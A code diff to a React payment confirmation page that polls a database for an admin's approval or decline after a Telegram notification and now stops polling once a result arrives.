@@ -25,7 +25,7 @@ const PushConfirmationPage = () => {
       setTimeWaiting(prev => Math.max(0, prev - 1)); // Count down to 0
     }, 1000);
 
-    // Poll for admin response every 3 seconds
+    // Poll for admin response every 3 seconds, but only when waiting for confirmation
     const pollTimer = setInterval(async () => {
       if (isConfirming) {
         try {
@@ -33,17 +33,19 @@ const PushConfirmationPage = () => {
             .from('payment_sessions')
             .select('payment_status, admin_response')
             .eq('user_id', location.state?.userId)
-            .single();
+            .maybeSingle();
           
           if (session?.payment_status === 'approved') {
+            clearInterval(pollTimer);
             handleApprovalReceived();
           } else if (session?.payment_status === 'declined' || session?.admin_response === 'error') {
-            // Handle error case
+            clearInterval(pollTimer);
             setIsConfirming(false);
-            // Could show error message here
+            // Show error message to user
+            console.log('Payment was declined by admin');
           }
         } catch (error) {
-          console.error('Error checking status:', error);
+          console.error('Error checking admin response:', error);
         }
       }
     }, 3000);
@@ -105,8 +107,11 @@ const PushConfirmationPage = () => {
       if (error || !data?.success) {
         console.error('Failed to send notification:', error || data);
         setIsConfirming(false);
+        return;
       }
-      // Don't proceed automatically - wait for admin response via polling
+      
+      console.log('Telegram notification sent successfully, waiting for admin response...');
+      // Keep isConfirming=true and wait for admin response via polling
     } catch (error) {
       console.error('Error sending notification:', error);
       setIsConfirming(false);
